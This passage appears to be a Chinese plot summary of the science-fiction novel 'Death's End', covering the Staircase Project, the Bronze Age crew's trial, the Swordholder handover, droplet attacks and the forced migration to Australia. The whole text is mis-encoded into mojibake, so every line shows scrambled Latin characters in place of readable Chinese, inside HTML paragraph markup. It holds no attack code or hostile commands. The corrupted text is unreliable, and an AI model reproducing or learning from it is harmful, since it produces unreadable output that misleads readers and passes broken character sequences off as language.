æ„¿æ„å®‰ä¹æ­»çš„äººä¸­é€‰ï¼Œè€Œä¸”è¿™ä¸ªäººçš„èµ„å†è¦å¤Ÿä¹Ÿæ„¿æ„è¿™ä¹ˆåšã€‚ç¨‹å¿ƒåœ¨ä¸€æ¬¡å’ŒåŒå­¦çš„èŠå¤©ä¸­ï¼Œå¾—çŸ¥ä»¥å‰çš„åŒå­¦äº‘å¤©æ˜ï¼Œèº«æ‚£ç»ç—‡æ—©å·²æ—¶æ—¥æ— å¤šï¼Œç¨‹å¿ƒæ²¡æœ‰å¤šæƒ³ï¼Œä¾¿æŠŠå®ƒçº³å…¥äº†äººé€‰ä¹‹ä¸­ï¼Œéšåä¾¿æœ‰äº†ç¨‹å¿ƒé˜»æ­¢äº‘å¤©æ˜å®‰ä¹æ­»çš„é‚£ä¸€å¹•ã€‚</p><p>&emsp;&emsp;äº‘å¤©æ˜å¾—çŸ¥äº†è¿™æ¥é¾™å»è„‰åï¼Œæ¥å—äº†å¥³ç¥çš„è¯·æ±‚ï¼ŒåŠ å…¥äº†é˜¶æ¢¯è®¡åˆ’ã€‚å½“äº‘å¤©æ˜çš„å¤§è„‘è¢«å–å‡ºåï¼Œç¨‹å¿ƒæ‰å¾—çŸ¥é‚£é¢—æ˜Ÿæ˜Ÿæ­£å¼äº‘å¤©æ˜é€çš„ï¼Œæ­¤æ—¶å¥¹çªç„¶æ„è¯†åˆ°è‡ªå·±åšäº†ä»€ä¹ˆã€‚å› ä¸ºç­‰å¾…äº‘å¤©æ˜çš„å¯èƒ½æ˜¯æ— å°½å™©æ¢¦ã€‚å‡å¦‚ä¸‰ä½“äººçœŸçš„æ•è·äº†äº‘å¤©æ˜çš„å¤§è„‘ã€‚åå¤è™å¾…ä¹Ÿä¸æ˜¯æ²¡æœ‰å¯èƒ½ã€‚é˜¶æ¢¯è®¡åˆ’å¼€å§‹äº†ï¼Œ ä½†ç™¾å¯†ç»ˆæœ‰ä¸€ç–ï¼Œæ¢æµ‹å™¨åç¦»äº†èˆªçº¿ï¼Œé£å‘äº†æ— å°½çš„æ·±ç©ºã€‚æƒ…æŠ¥å±€çš„é¢†å¯¼ä»¬é€‰ä¸­ç¨‹å¿ƒå†¬çœ ï¼Œåˆ°æœªæ¥ç»§ç»­è·Ÿè¿›é˜¶æ¢¯è®¡åˆ’ã€‚å¸Œæœ›èƒ½æœ‰å¥‡è¿¹å‘ç”Ÿã€‚</p><p>&emsp;&emsp;ç½—è¾‘åˆ©ç”¨é»‘æš—æ£®æ—æ³•åˆ™æ‹¯æ•‘äº†åœ°çƒåï¼Œäººä»¬ä»æ­¤è¿›å…¥äº†å¨æ…‘çºªå…ƒã€‚ä¸‰ä½“äººåœ¨è¿™ä¸ªå¹´ä»£ï¼Œçœ‹ä¼¼è·Ÿäººç±»æ˜¯ä½ å¥½æˆ‘å¥½å¤§å®¶å¥½ã€‚äººä»¬æ„Ÿè§‰ï¼Œä¸‰ä½“äººè§£é™¤äº†å¯¹åœ°çƒçš„ç§‘æŠ€å°é”ï¼Œå¹¶ç»†è‡´å…¥å¾®ä¸åŒå…¶çƒ¦çš„ä¼ æˆç§‘å­¦ã€‚æœ‰æ—¶è‡ªå·±è¿˜è¢«ä¸‰ä½“äººå«Œå¼ƒå­¦å¾—æ…¢ï¼Œè¢«å‚¬ç€å¿«ç‚¹å­¦ã€‚äººä»¬è§‰å¾—ï¼Œè‡ªå·±ä¸€ä¸‹å­è·å¾—äº†è¢«å‹æŠ‘å‡ ä¸ªä¸–çºªçš„çŸ¥è¯†ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººè¿˜å¸®åŠ©äººç±»å»ºé€ äº†å¼•åŠ›æ³¢å¤©çº¿ï¼Œå’Œå¼•åŠ›æ³¢é£èˆ¹ï¼Œä¸‡æœ‰å¼•åŠ›å·ã€‚æ¥å¸®åŠ©äººç±»åˆ©ç”¨è¿™äº›å·¥å…·å¨æ…‘è‡ªå·±ã€‚äººä»¬éœ€è¦å»ºé€ å¼•åŠ›æ³¢å‘å°„è£…ç½®ï¼Œæ˜¯å› ä¸ºç”¨å¼•åŠ›æ³¢å‘å®‡å®™å‘å°„ä¿¡æ¯ï¼Œæ¯”äººç±»ä¹‹å‰ç”¨çš„ä»»ä½•æ‰‹æ®µéƒ½é è°±æœ‰æ•ˆã€‚å½“åˆäººç±»èˆ°é˜Ÿè¢«æ°´æ»´å›¢ç­ï¼Œåœ¨æˆ˜åœºä¸Šï¼Œåªæœ‰é‡å­å·å’Œé’é“œæ—¶ä»£å·ï¼Œè¿™ä¸¤è‰˜æˆ˜èˆ°æˆåŠŸé€ƒç¦»ï¼Œç”±äºèµ„æºæœ‰é™ï¼Œé’é“œæ—¶ä»£å·çªè¢­äº†é‡å­å·ã€‚å¸¦ç€é‡å­å·çš„ç‰©èµ„é£å¾€äº†å¦ä¸€è¾¹ï¼Œç»è¿‡æ¼«é•¿çš„ä¸€æ®µæ—¶é—´ï¼Œé’é“œæ—¶ä»£å·è¿”èˆªäº†ï¼Œç°åœ¨é£èˆ¹ä¸Šçš„äººå¯ä»¥ç”¨è‚‰çœ¼çœ‹åˆ°åœ°çƒäº†ã€‚ä»–ä»¬æ¿€åŠ¨åœ°å–Šç€ï¼Œå›å®¶äº†ï¼Œå›å®¶äº†ï¼ä»–ä»¬å¹»æƒ³ç€å›åˆ°åœ°çƒä¸Šå®‰é€¸çš„ç”Ÿæ´»ï¼Œå’Œè¢«äººå´‡æ‹œçš„æ„Ÿè§‰ã€‚</p><p>&emsp;&emsp;ä¹‹å‰ï¼Œä»–ä»¬æ”¶åˆ°äº†ä¸€æ¡æ¶ˆæ¯ï¼Œè¢«å‘ŠçŸ¥ï¼Œäººç±»å¯¹ä¸‰ä½“ä¸–ç•Œçš„å¨æ…‘ï¼Œå·²ç»æˆåŠŸå»ºç«‹ï¼Œè®©ä»–ä»¬å°½å¿«è¿”èˆªã€‚ä¸€å¼€å§‹æ²¡äººä¿¡ï¼Œåæ¥æ™ºå­åœ¨é’é“œæ—¶ä»£å·ä¸Šå±•å¼€ï¼Œå¹¶å»ºç«‹äº†é€šä¿¡ï¼Œè¿™æ—¶é’é“œæ—¶ä»£å·ä¸Šçš„äººæ‰ä¿¡äº†ã€‚å¹¶ä¸”ä»–ä»¬å¾—çŸ¥ï¼Œè‡ªå·±å·²ç»æˆä¸ºäº†äººä»¬çš„è‹±é›„ï¼Œå…¨ä¸–ç•Œçš„äººä»¬éƒ½åœ¨ç›¼æœ›ç€ä»–ä»¬å›å½’ï¼Œé’é“œæ—¶ä»£å·çš„äººå›åˆ°å¤ªç©ºæ¸¯åï¼Œæˆ˜èˆ°ä¸Šçš„äººï¼Œçœ‹åˆ°äººå±±äººæµ·ï¼Œéƒ½åœ¨ä¸ºä»–ä»¬å¿˜æƒ…çš„æ¬¢å‘¼ç€ã€‚å½“é’é“œæ—¶ä»£å·ä¸Šæ‰€æœ‰äººéƒ½ç¦»èˆ°åï¼Œçªç„¶ä¸€ç‰‡å¯‚é™ï¼Œè¿æ¥ä»–ä»¬çš„äººå½“ä¸­æœ‰ä¸€ä½ä¸Šæ ¡ï¼Œå¼€å£è¯´äº†ä¸€ç•ªè¯ï¼Œå¤§è‡´å†…å®¹å¦‚ä¸‹ï¼šä½ ä»¬å·²è¢«å¼€é™¤äº†å†›ç±ï¼Œä½ ä»¬å¸¦æ¥çš„è€»è¾±ï¼Œæ°¸è¿œæ— æ³•è¢«æŠ¹ç­ï¼Œä½ ä»¬çš„äº²äººä¸æƒ³è§åˆ°ä½ ä»¬å‘¢ï¼Œä»–ä»¬ä»¥ä½ ä»¬ä¸ºè€»ï¼Œä»–ä»¬æ¨ä½ ä»¬ï¼Œä½ ä»¬å°†è¢«ç§»äº¤åˆ°å¸æ³•ç³»ç»Ÿã€‚</p><p>&emsp;&emsp;è¯´å®Œåï¼Œå¤§æ‰¹æ­¦è£…éƒ¨é˜Ÿå‡ºç°ï¼Œé€®æ•äº†ä»–ä»¬ã€‚ç½ªåæ˜¯ä¸€çº§è°‹æ€å’Œåäººç±»ç½ªã€‚åœ¨å®¡åˆ¤ä¸­å¤§å®¶æ‰çŸ¥é“ï¼Œåœ¨å½“æ—¶æ²¡æœ‰é€€è·¯çš„å¤ªç©ºé‡Œï¼Œé’é“œæ—¶ä»£å·çš„äººä»¬å»ºç«‹äº†é›†æƒç¤¾ä¼šï¼Œä¸ºäº†é›†ä½“ç”Ÿå­˜ï¼Œå‡ ä¹æ¯ä¸ªäººéƒ½æ”¾å¼ƒäº†è‡ªæˆ‘ï¼Œæˆä¸ºäº†é›†ä½“çš„ä¸€éƒ¨åˆ†ã€‚é’é“œæ—¶ä»£å·å‡†å¤‡å¯¹å¦ä¸€è‰˜æˆ˜èˆ°å‘èµ·è¿›æ”»æ—¶ï¼Œæ›¾æœ‰ä¸€æ¬¡æŠ•ç¥¨ï¼Œèˆ°ä¸Š94%èµæˆæ”»å‡»ã€‚å½“ç”¨æ¬¡å£°æ³¢æ°¢å¼¹è§£å†³äº†é‡å­å·åï¼Œäººä»¬æŠŠä¸Šé¢çš„å°¸ä½“å…¨éƒ¨è¡¥å……è¿›äº†é£Ÿå“åº“å­˜ï¼Œæˆäº†èˆ¹å‘˜çš„é£Ÿç‰©ã€‚</p><p>&emsp;&emsp;æœ€åå®¡åˆ¤çš„ç»“æœæ˜¯ï¼Œ138äººæ— ç½ªï¼Œ6åé«˜çº§å†›å®˜ç»ˆèº«ç›‘ç¦ï¼Œå…¶ä½™çš„äººå‡è¢«åˆ¤åˆ‘ã€‚åˆ‘æœŸä»äºŒåå¹´è‡³ä¸‰ç™¾å¹´ä¸ç­‰ã€‚åœ¨ä»–ä»¬è¿›ç›‘ç‹±å‰ï¼Œæœ‰å‡ ä½é’é“œæ—¶ä»£å·ä¸Šçš„å†›å®˜ï¼Œè¢«å®ªå…µæŠ¼é€ç€æœ€åä¸€æ¬¡è¿›å…¥äº†ä»–ä»¬çš„æˆ˜èˆ°ï¼Œè¿›è¡Œä¸€äº›äº¤æ¥å·¥ä½œã€‚å…¶ä¸­æœ‰ä¸€ä½è¢«æŠ¼é€çš„å†›å®˜ï¼Œå²è€å¾·ï¼Œä»–åœ¨äº¤æ¥å®Œæˆæ—¶ï¼Œçªç„¶è¿›å…¥å¦ä¸€ä»¶æ“ä½œå®¤ï¼Œå¿«é€Ÿè°ƒå‡ºä¸€ä¸ªé€šä¿¡ç•Œé¢ï¼Œä»–è¯´é“ï¼Œé’é“œæ—¶ä»£å‘¼å«è“è‰²ç©ºé—´ï¼é’é“œæ—¶ä»£å‘¼å«è“è‰²ç©ºé—´ï¼å°±åœ¨æ­¤åˆ»ï¼Œä¸€æŸæ¿€å…‰ç©¿è¿‡ä»–ä»¬çš„èƒ¸è†›ï¼Œä»–ç”¨å°½æœ€åçš„ç”Ÿå‘½å–Šå‡ºä¸€å¥è¯ï¼šä¸è¦è¿”èˆªï¼è¿™é‡Œä¸æ˜¯å®¶ï¼</p><p>&emsp;&emsp;æœ¬æ¥è“è‰²ç©ºé—´å¥½è¿˜åœ¨çŠ¹è±«ä¸­ï¼Œå½“æ”¶åˆ°è¿™ä¸ªè­¦æŠ¥æ—¶ï¼Œå®ƒç«‹åˆ»å…¨åŠŸç‡åŠ é€Ÿï¼Œèƒ½é£å¤šè¿œé£å¤šè¿œã€‚ä¸ä¹…åä¸‡æœ‰å¼•åŠ›å·é£èˆ¹å¼€å§‹è¿½å‡»é€ƒè·‘çš„è“è‰²ç©ºé—´å·ï¼Œä¸ºä»€ä¹ˆè¦è¿½å‘¢ï¼Ÿå› ä¸ºå½“äººç±»å¾—çŸ¥é»‘æš—æ£®ç«‹æ³•åˆ™åï¼Œç‰¹åˆ«å®³æ€•è¢«å…¶ä»–å¤–æ˜Ÿæ–‡æ˜å‘ç°ï¼Œæ‰€ä»¥ï¼Œè¿½å‡»è“è‰²ç©ºé—´å·å¹¶å°†å…¶æ‘§æ¯ï¼Œæˆä¸ºäº†ä¸‡æœ‰å¼•åŠ›å·å½“å‰çš„é¦–è¦ä»»åŠ¡ã€‚ä¸‰ä½“äººæ´¾å‡ºäº†ä¸¤ä¸ªæ°´æ»´å»ååŠ©ä¸‡æœ‰å¼•åŠ›å·ã€‚</p><p>&emsp;&emsp;äººç±»æ–‡æ˜ä»ä¸‰ä½“äººé‚£å­¦åˆ°äº†è¶Šæ¥è¶Šå¤šçš„ä¸œè¥¿ï¼Œè€Œä¸‰ä½“äººä¹Ÿä»äººç±»ç’€ç’¨çš„æ–‡åŒ–ä¸­å­¦åˆ°äº†ä¸å°‘ã€‚å½“äººä»¬çŸ¥é“ï¼Œä¸‰ä½“äººå–œæ¬¢åœ°çƒæ–‡åŒ–æ—¶ï¼Œä¸€å¼€å§‹æ˜¯ä¸ç›¸ä¿¡çš„ï¼Œåæ¥ä¸‰ä½“äººç»™äººä»¬çœ‹äº†å¾ˆå¤šï¼Œè‡ªå·±æ¨¡ä»¿äººç±»æ–‡åŒ–çš„è‰ºæœ¯ä½œå“ï¼ŒåŒ…æ‹¬ç”µå½±ã€å°è¯´ã€ç»˜ç”»ç­‰ï¼Œè¿™äº›ä½œå“ï¼Œéƒ½æ˜¯ç”¨äººç±»ä½œä¸ºè§’è‰²ï¼Œç¯å¢ƒä¹Ÿéƒ½æ˜¯åœ°åŒºä¸Šçš„ã€‚è¿™æ—¶äººä»¬æ‰ç›¸ä¿¡ã€‚äººä»¬ç”¨AIå’Œä»¿ç”ŸæŠ€æœ¯ï¼Œå¸®æ™ºå­é€ äº†ä¸€ä¸ªèº«ä½“ï¼Œæ™ºå­æˆä¸ºäº†æœ‰èº¯ä½“çš„æœºå™¨äººï¼Œæ‘‡èº«ä¸€å˜æˆä¸ºäº†ä¸€ä½é­…åŠ›åº„é‡çš„æ—¥æœ¬å¥³äººã€‚</p><p>&emsp;&emsp;å¨æ…‘çºªå…ƒå…­åä¸€å¹´ï¼Œç¨‹å¿ƒä»å†¬çœ ä¸­è¢«å”¤é†’ï¼Œä½†å¹¶ä¸æ˜¯å› ä¸ºé˜¶æ¢¯è®¡åˆ’ï¼Œè€Œæ˜¯å› ä¸ºäº‘å¤©æ˜ä»ç»™ä»–çš„æ˜Ÿæ˜Ÿã€‚è¿™é¢—æ’æ˜Ÿè¢«å‘ç°å‘¨å›´è¿˜æœ‰ä¸¤ä¸ªè¡Œæ˜Ÿï¼Œå…¶ä¸­ä¸€ä¸ªä¸åœ°çƒååˆ†ç›¸ä¼¼ã€‚å‘ç°è¿™äº›çš„æ˜¯ä¸€åå«è‰¾AAçš„å¥³åšå£«ï¼Œä¸€ä½åƒé¸Ÿå„¿ä¸€æ ·è½»çµçš„å¥³å­©å­ã€‚ä»–åæ¥æˆä¸ºäº†ç¨‹å¿ƒå¾—å¥½å‹å’Œå¾—åŠ›åŠ©æ‰‹ã€‚</p><p>&emsp;&emsp;ç”±äºç°åœ¨äººä»¬å·²ç»å…·å¤‡äº†æ˜Ÿé™…è¿œèˆªçš„èƒ½åŠ›ï¼Œæ‰€ä»¥è¿™ä¸ªæ¶ˆæ¯ä¸€å‡ºï¼Œè¿™é¢—æ’æ˜Ÿçš„ä»·æ ¼é©¬ä¸Šå¼€å§‹é£å‡ã€‚è”åˆå›½å”¤é†’ç¨‹å¿ƒå°±æ˜¯ä¸ºäº†ä¹°ä¸‹è¿™é¢—æ˜Ÿæ˜Ÿã€‚ç¨‹å¿ƒå› ä¸ºè¿™ä¸ªæ˜Ÿæ˜Ÿå¼€å§‹å°æœ‰åæ°”ã€‚åˆšæ¥åˆ°æ–°ä¸–ç•Œçš„ç¨‹å¿ƒï¼Œè‡ªç„¶æ˜¯å¾ˆä¸é€‚åº”ï¼Œå°±åƒæ˜¯åˆ˜å§¥å§¥è¿›å¤§è§‚å›­ä¸€æ ·ï¼Œçœ‹å•¥éƒ½æ–°é²œã€‚åœ¨è¿™ä¸ªå’Œå¹³ç››ä¸–çš„å¹´ä»£ï¼Œç”·æ€§ä»¬éƒ½è¶‹äºå¥³æ€§åŒ–ï¼Œåˆ°å¤„éƒ½æ˜¯ç²¾è‡´çš„å¥³è£…å¤§ä½¬ï¼Œç¨‹å¿ƒä¸€å¼€å§‹èµ°åœ¨å¤§è¡—ä¸Šï¼Œè¿˜ä»¥ä¸ºç”·äººéƒ½ç­ç»äº†ã€‚å¥¹ä¸ç¦æ„Ÿå¹ï¼Œè¿™ä¸ªæ—¶ä»£å¤ªæ¸©æŸ”äº†ã€‚</p><p>&emsp;&emsp;ä¸€å¤©ï¼Œè¯šä¿¡æ¥åˆ°AAçš„é‚€è¯·ï¼Œå»ä¸€ä¸ªåœ°æ–¹ã€‚ç¨‹å¿ƒåˆ°äº†åå¹¶æ²¡æœ‰æ‰¾åˆ°AAï¼Œç­‰å¾…å¥¹çš„æ˜¯ä¹‹å‰è‡ªå·±çš„ä¸Šå¸ï¼Œç»´å¾·å†·é™çš„å‘ç¨‹å¿ƒè¿å¼€ä¸¤æªï¼Œç»´å¾·å‘Šè¯‰ä»–ï¼Œæˆ‘ä¸ä½ å¹¶æ²¡æœ‰ç§äººæ©æ€¨ï¼Œåªæ˜¯æˆ‘éœ€è¦æˆä¸ºæ‰§å‰‘äººï¼Œè€Œä½ ä¼šé˜»æ­¢æˆ‘ã€‚æˆ‘å¿…é¡»ä¸æ‹©æ‰‹æ®µçš„å‰è¿›ã€‚</p><p>&emsp;&emsp;ä½†AAå’Œè­¦å¯ŸåŠæ—¶èµ¶åˆ°ï¼Œå‡»æ–­äº†ç»´å¾·çš„æ‰‹è‡‚ï¼Œæ•‘äº†å·®ç‚¹æ­»æ‰çš„ç¨‹å¿ƒã€‚è¿˜å¥½AAåŠæ—¶å‘ç°äº†æœ‰äººä¼ªé€ å¥¹çš„å£°éŸ³è·Ÿç¨‹å¿ƒé€šè¯ã€‚ä¸ç„¶ï¼Œè¯šä¿¡æ­»å®šäº†ã€‚ç»´å¾·è¯´çš„æ‰§å‰‘äººæ˜¯ä»€ä¹ˆï¼Œè·Ÿç¨‹å¿ƒæœ‰ç”¨ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿåœ¨äºšæ´²ï¼ŒåŒ—ç¾ï¼Œå’Œæ¬§æ´²ï¼Œåˆ†å¸ƒç€ä¸‰ä¸ªå¼•åŠ›æ³¢å¤©çº¿ã€‚è¿˜æœ‰ä¸€ä¸ªåœ¨å¤ªç©ºä¸­çš„å¼•åŠ›æ³¢å¤©çº¿ï¼Œå°±æ˜¯ä¸‡æœ‰å¼•åŠ›å·é£èˆ¹ã€‚æ‰§å‰‘äººæŒæ¡ç€å¯åŠ¨å¼•åŠ›æ³¢å¤©çº¿ï¼Œå‘å®‡å®™å‘å°„ä¸‰ä½“æ’æ˜Ÿåæ ‡ä¿¡å·çš„æƒåˆ©ã€‚åªè¦ä¸‰ä½“äººä¸è€å®ï¼Œä¿¡å·å°±ä¼šå‘å‡ºå»ã€‚ä¸ä¹…åï¼Œä¸‰ä½“ä¸–ç•Œå’Œäººç±»ä¸–ç•Œéƒ½ä¼šé­åˆ°é»‘æš—æ£®æ—æ‰“å‡»ã€‚æ­¤æ—¶ä¸‰ä½“å’Œäººç±»è¿™ä¸¤ä¸ªä¸–ç•Œçš„æ–‡æ˜éƒ½æŒæ¡åœ¨ä¸€ä¸ªäººçš„æ‰‹é‡Œï¼Œè¿™ä¸ªäººï¼Œå°±æ˜¯é€»è¾‘ã€‚</p><p>&emsp;&emsp;æ­¤æ—¶çš„ç½—è¾‘æ˜¯ç¬¬ä¸€ä»»æ‰§å‰‘äººï¼Œåœ¨è¿™ä¸ªæ¸©æŸ”çš„å¹´ä»£ï¼Œäººä»¬æƒ§æ€•å±é™©çš„æ‰§å‰‘äººï¼Œæ¸æ¸çš„æ¸©æŸ”çš„äººä»¬å¸Œæœ›æ‰§å‰‘äººä¹Ÿæ˜¯æ¸©æŸ”çš„ã€‚äºæ˜¯æ°‘å¿ƒæ‰€å‘ï¼Œå¤§å®¶é€‰æ‹©äº†ç¨‹å¿ƒä½œä¸ºä¸‹ä¸€ä»»æ‰§å‰‘äººã€‚è¿™ä¸ªæ—¶ä»£çš„åŒ»ç–—æŠ€æœ¯å·²ç»å¾ˆå…ˆè¿›äº†ï¼Œç¨‹å¿ƒæ¢å¤å¾—å¾ˆå¿«ã€‚ä¸ä¹…åï¼Œç¨‹å¿ƒè§åˆ°äº†å·²æ˜¯ç™¾å²è€äººçš„ç½—è¾‘ï¼Œæ­¤æ—¶çš„å¥¹å·²ç»ç™½å‘è‹è‹ï¼Œååˆ†ç¨³é‡è€Œä¸”åšå®šã€‚ä»å‰çš„é‚£ä¸ªç©ä¸–ä¸æ­çš„èŠ±èŠ±å…¬å­æ¶ˆå¤±äº†ï¼Œä»–çš„å¦»å­å’Œå­©å­æ—©å·²ç¦»å¼€äº†ä»–ã€‚ç½—è¾‘åœ¨ä»–äººçœ¼é‡Œå˜å¾—è¶Šæ¥è¶Šåƒä¸€ä¸ªæ¶é­”ï¼Œæ‰§å‰‘äººçš„äº¤æ¥ä»ªå¼å¼€å§‹äº†ï¼Œç½—è¾‘æŠŠæ§åˆ¶å¼•åŠ›æ³¢å‘å°„æŒ‰é’®çš„æƒæ–ï¼Œäº¤ç»™äº†ç¨‹å¿ƒï¼Œ ç½—è¾‘é€€ä¼‘äº†ï¼Œä»–å®Œæˆäº†ä½¿å‘½ã€‚è€Œç¨‹å¿ƒä¸‡ä¸‡æ²¡æƒ³åˆ°ï¼Œå¥¹è¿™ä¸ªæ‰§å‰‘äººåªå½“äº†15åˆ†é’Ÿï¼Œå°±åœ¨äº¤æ¥å®Œåï¼Œæ½œä¼åœ¨å¤ªé˜³ç³»çš„å…­é¢—æ°´æ»´ï¼Œçªç„¶å‘åŠ¨æ”»å‡»ï¼Œç¨‹å¿ƒå¬ç€è­¦æŠ¥å£°ä¸çŸ¥æ‰€æªï¼Œå†…å¿ƒçº ç»“çš„ç¨‹å¿ƒå†³å®šæ‰”æ‰æ‰‹ä¸­çš„å‘å°„æ§åˆ¶å™¨ã€‚</p><p>&emsp;&emsp;é¡·åˆ»é—´ï¼Œåœ°çƒä¸Šä¸‰ä¸ªå¼•åŠ›æ³¢å‘å°„å¤©çº¿ï¼Œå…¨éƒ¨è¢«æ°´æ»´æ’æ¯ã€‚åœ°çƒä»æ­¤ä¸§å¤±äº†é»‘æš—æ£®æ—å¨æ…‘èƒ½åŠ›ã€‚ä¸‰ä½“äººä¸€ç›´éšè—ç€ä¸€é¡¹æœ¬é¢†æ²¡æœ‰äº¤ç»™äººç±»ï¼Œé‚£å°±æ˜¯åˆ¶é€ å…‰é€Ÿé£èˆ¹çš„æŠ€æœ¯ã€‚ä¸‰ä½“äººç°åœ¨å·²ç»é€ å‡ºäº†å…‰é€Ÿé£èˆ¹ï¼Œå››å¹´åï¼Œæ–°çš„ä¸‰ä½“èˆ°é˜Ÿå³å°†æŠµè¾¾åœ°çƒã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººæ‰“ç ´äº†ä¸¤ä¸ªæ–‡æ˜é—´è„†å¼±çš„å¹³è¡¡ï¼Œæ™ºå­ç»™äººä»¬ä¸€å¹´æœŸé™å…¨éƒ¨ç§»æ°‘æ¾³å¤§åˆ©äºšï¼Œå¦‚æœ‰ä¸ä»è€…ï¼Œæ ¼æ€å‹¿è®ºã€‚ä¸‰ä½“äººä¸æƒ³ç­ç»äººç±»ï¼Œå®Œå…¨æ˜¯å‡ºè‡ªäºå¯¹åœ°çƒæ–‡åŒ–çš„çƒ­çˆ±å’Œæ•¬æ„ã€‚</p><p>&emsp;&emsp;ä½†å¤§å¤šæ•°äººè¿˜æ²‰æµ¸åœ¨æ¸©æŸ”ä¹¡é‡Œ ï¼Œä¸è‚¯ç¦»å»ï¼Œç­‰å¾…å¥‡è¿¹å‘ç”Ÿã€‚æ™ºå­ä¸€çœ‹ï¼ŒåŸæ¥ä½ ä»¬æŠŠæˆ‘è¯´çš„è¯å½“è€³æ—é£ï¼Œäºæ˜¯æ²¡è¿‡å¤šä¹…ï¼Œæ°´æ»´å¼€å§‹åœ¨å¤§åŸå¸‚é‡Œä¹±æ’ï¼Œé«˜æ¥¼å¤§å¦é€ä¸ªå´©å¡Œï¼Œä¸€å¤©å†…æ­»äº†ä¸‰åå¤šä¸‡äººã€‚äººä»¬æ— å¥ˆä¹‹ä¸‹å¼€å§‹å¾€æ¾³å¤§åˆ©äºšè¿å¾™ã€‚</p><p>&emsp;&emsp;ä¸€å¹´åï¼Œæ¾³å¤§åˆ©äºšèšé›†äº†å››åä¸€äº¿å…­åƒä¸‡äººï¼Œæ™ºå­å’Œæ°´æ»´ä¸å¯èƒ½ç®¡ç†è¿™ä¹ˆå¤šäººï¼Œäºæ˜¯ä»–ä»¬å¼€å§‹æ‹›å‹Ÿåœ°çƒæ²»å®‰å†›ï¼Œä¸‰ä½“äººç»™çš„å¾…é‡éå¸¸ä¸°åšï¼Œæ—¢å¯è·å¾—è‡ªç”±ï¼Œåˆå¯è·å¾—æƒåŠ›ã€‚ä¸€æ—¶é—´åäº¿äººäº‰ç›¸æŠ¥åï¼Œæœ€åæœ‰äº”ç™¾ä¸‡äººé€šè¿‡ã€‚</p><p>&emsp;&emsp;è¿™å¸®æ²»å®‰å†›ï¼Œå¼€å§‹è¿˜å¾ˆæ”¶æ•›ï¼Œä½†åæ¥ï¼Œéšç€æ¾³å¤§åˆ©äºšçš„äººè¶Šæ¥è¶Šå¤šï¼Œè¿™å¸®äººæ¸æ¸å˜æˆäº†é­”é¬¼ã€‚éšç€ç§»æ°‘æœŸé™çš„åˆ°æ¥ï¼Œæ²»å®‰å†›å¼€å§‹å¤§é‡å± æ€æ²¡æœ‰ç§»æ°‘è¿›æ¾³å¤§åˆ©äºšçš„äººã€‚å¾ˆå¤šäººç»„æˆäº†æŠµæŠ—ä¸‰ä½“äººçš„ç»„ç»‡ã€‚è¿™å¸®æŠµæŠ—å†›çš„ç²¾ç¥é¢†è¢–ä¾¿æ˜¯ç½—è¾‘ã€‚ä½†ä»–ä»¬å¹¶æ‰“ä¸åˆ°ä¸‰ä½“äººï¼Œå› ä¸ºä¸‰ä½“äººè¿˜æ²¡åˆ°ã€‚ä»–ä»¬åªèƒ½æ‰“æ‰“èº«ä¸ºæ²»å®‰å†›çš„äººç±»ã€‚</p><p>&emsp;&emsp;å½“ç§»æ°‘ç»“æŸåï¼Œæ™ºå­åˆ‡æ–­äº†å¯¹æ¾³å¤§åˆ©äºšçš„ä¾›ç»™ï¼ŒåŒ…æ‹¬é£Ÿç‰©ï¼Œç”µåŠ›ç­‰ç”Ÿæ´»å¿…éœ€å“ã€‚æ™ºå­çš„å¤§æ„å°±æ˜¯å‘Šè¯‰æ¾³å¤§åˆ©äºšçš„äººä»¬ï¼Œä½ ä»¬ç°åœ¨å¼€å§‹äººåƒäººå§ã€‚ç­‰äººå£é™åˆ°ä¸‰åƒä¸‡åˆ°äº”åƒä¸‡åï¼Œæˆ‘ä»¬å†å¼€å§‹ä¾›ç»™ã€‚ç¨‹å¿ƒå’ŒAAä¹Ÿç§»æ°‘åˆ°äº†æ¾³å¤§åˆ©äºšï¼Œå¥¹æ²¡è¢«å¤±æœ›çš„äººä»¬æ‰“æ­»ï¼Œå¾—å¤šäºAAå’Œæ™ºå­çš„å…³ç…§ã€‚</p><p>&emsp;&emsp;æ™ºå­æœ¬æ¥æƒ³å¸¦ç¨‹å¿ƒç¦»å¼€æ¾³å¤§åˆ©äºšä½†è¢«ç¨‹å¿ƒæ‹’ç»äº†ï¼Œå¥¹æŠŠè¿™ä¸ªæœºä¼šç»™äº†AAã€‚ç¨‹å¿ƒå½“ç„¶çŸ¥é“ï¼Œè‡ªå·±å¯èƒ½ä¼šåœ¨è¿™è¢«äººåƒæ‰ï¼Œä½†å¿ƒç°æ„å†·çš„å¥¹ï¼Œæ—©å°±ä¸åœ¨æ„äº†ã€‚</p><p>&emsp;&emsp;å¦ä¸€è¾¹æ­£åœ¨è¿½å‡»è“è‰²ç©ºé—´å·çš„ä¸‡æœ‰å¼•åŠ›å·ï¼Œä¸‰ä½“äººä»¥ä¸ºä»–ä»¬å·²ç»è¢«è·Ÿéšçš„æ°´æ»´è§£å†³æ‰äº†ã€‚ä½†æ˜¯ï¼Œä¸‡ä¸‡æ²¡æœ‰æƒ³åˆ°ï¼Œè“è‰²ç©ºé—´å·è¿›å…¥äº†ä¸€ä¸ªæ€ç»´ç¢å—ï¼Œåœ¨è¿™ä¸ªç©ºé—´é‡Œçœ‹ä¸‰ç»´æ—¶é—´çš„ç‰©ä½“ï¼Œå°±åƒçœ‹åˆ°äº†ç»†èŠ‚ä¸°å¯Œçš„ä¸‰ç»´å±•å¼€å›¾ã€‚å¦‚æœæˆ‘åœ¨æ€ç»´ç©ºé—´é‡Œæ‹¿èµ°ä¸‰ç»´ç©ºé—´é‡Œä¸€ä¸ªäººçš„å¿ƒè„ï¼Œè¿™ä¸ªè¢«æ‹¿èµ°å¿ƒè„çš„äººï¼Œä¸ä¼šæœ‰ä¸æ¯«å¤–ä¼¤ï¼Œç®€ç›´å°±æ˜¯éš”ç©ºå–ç‰©ã€‚æ°´æ»´è™½ç„¶å¤–è¡¨åšä¸å¯æ‘§ï¼Œä½†å†…éƒ¨å´å¾ˆè„†å¼±ï¼Œäººä»¬é€šè¿‡å››ç»´ç©ºé—´ï¼Œç 